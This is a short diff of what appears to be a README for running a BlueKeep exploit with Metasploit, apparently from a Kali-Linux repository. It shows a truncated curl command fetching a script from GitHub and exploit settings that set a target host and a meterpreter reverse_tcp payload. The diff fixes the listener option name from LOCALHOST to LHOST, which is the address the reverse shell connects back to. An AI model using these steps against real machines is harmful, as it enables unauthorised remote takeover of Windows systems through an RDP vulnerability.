@@ -9,7 +9,7 @@ curl -s https://raw.githubusercontent.com/nu11secur1ty/Kali-Linux/master/BlueKee
 ```bash
 SET RHOSTS 0.0.0.0 # target
 SET payload windows/64x/meterpreter/reverse_tcp # set the module
-SET LOCALHOST 0.0.0.0 # Your IP for receavin
+SET LHOST 0.0.0.0 # Your IP for receavin
 ```
 - Check for targets
 ```bash
